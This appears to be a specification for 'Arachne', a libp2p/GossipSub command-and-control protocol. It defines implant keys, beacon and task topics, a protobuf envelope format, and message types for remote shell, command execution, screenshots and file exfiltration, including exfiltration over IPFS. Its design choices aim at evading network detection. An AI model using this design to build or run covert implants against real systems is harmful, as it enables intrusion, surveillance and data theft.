# Arachne Protocol Specification

## 1. Peer Identity

### 1.1 Key Derivation

```
Operator Key: Ed25519 private key (operator.priv)
Operator PeerID: libp2p PeerID derived from operator.priv public key

Implant Key: Ephemeral Ed25519 (generated on first run)
Implant PeerID: libp2p PeerID from implant public key
```

### 1.2 Implant Certificate
On first execution, the implant generates:
- `implant.ed25519` - ephemeral keypair
- Registration envelope signed by operator key (embedded at build time)

## 2. Topic Structure

All topics use GossipSub via libp2p PubSub. Topic IDs use short opaque prefixes to reduce wire fingerprinting.

```
/c/<operator-peerid>/cx    # Commands — operator -> implants (broadcast)
/b/<operator-peerid>/bx    # Beacons — implants -> operator (heartbeat & results)
/b/<operator-peerid>/tx/<implant-peerid>  # Per-implant task topic (direct routing)
```

### Topic Authorization
- `commands` topic: messages validated against operator's public key
- `beacons` topic: messages validated against implant's public key
- `tasks/<id>` topic: messages validated against operator's public key
- Implants drop messages not signed by the operator
- Operator drops messages not signed by known implants on `beacons`

## 3. Envelope Format

All messages use Protocol Buffers. Message types use opaque Z-series identifiers.

```protobuf
package apb;

message Envelope {
  int64 ID = 1;
  uint32 Type = 2;
  bytes Data = 3;
  bytes Signature = 4;   // Signed by sender's key
  bytes SenderKey = 5;   // Public key of sender
}

// Z1 — Beacon register (async beacon mode)
message Z1 {
  string ID = 1;
  int64 Interval = 2;
  int64 Jitter = 3;
  Register Register = 4;  // commonpb.Register
  int64 NextCheckin = 5;
}
```

## 4. Protocol IDs

Direct libp2p streams use short protocol IDs:

| Protocol | ID |
|---|---|
| Shell | `/x/sh/1.0.0` |
| Port forward | `/x/pf/1.0.0` |
| SOCKS | `/x/sk/1.0.0` |

## 4. Session Types

### 4.1 Beacon Mode (Async)
1. Implant subscribes to `commands` topic and its per-implant `tasks/<id>` topic
2. Implant publishes `Z1` (beacon register) on `beacons` topic
3. Operator reads beacon, publishes tasks on `tasks/<id>` topic
4. Implant executes tasks, publishes results on `beacons`
5. Implant sleeps for `Interval + random(0, Jitter)`

### 4.2 Interactive Session Mode (Stream)
1. Operator initiates direct libp2p stream to implant
2. Bidirectional encrypted stream for shell/portfwd/socks
3. Uses libp2p stream multiplexing

## 5. Message Types

| Type | ID | Direction | Description |
|---|---|---|---|
| REGISTER | 0 | Implant -> Op | Initial beacon/registration |
| PING | 1 | Bidirectional | Keepalive |
| TASK | 2 | Op -> Implant | Execute command |
| TASK_RESULT | 3 | Implant -> Op | Command output |
| SHELL | 4 | Bidirectional | Interactive shell |
| DOWNLOAD | 5 | Implant -> Op | File exfiltration |
| UPLOAD | 6 | Op -> Implant | File deployment |
| SOCKS | 7 | Bidirectional | SOCKS proxy tunnel |
| PORTFWD | 8 | Bidirectional | Port forwarding |
| SCREENSHOT | 9 | Implant -> Op | Screen capture |
| LS | 10 | Op -> Implant | List directory |
| CD | 11 | Op -> Implant | Change directory |
| EXECUTE | 12 | Op -> Implant | Run command |
| DISCONNECT | 255 | Bidirectional | Clean close |

## 6. Data Exfiltration via IPFS

For large data (files, screenshots, logs):
1. Implant pins data to IPFS and gets a CID
2. Implant sends a small envelope containing the CID + encryption key
3. Operator fetches the data from IPFS using the CID
4. Optionally decrypts with the key sent in-band

This keeps the C2 channel low-bandwidth and hard to detect.
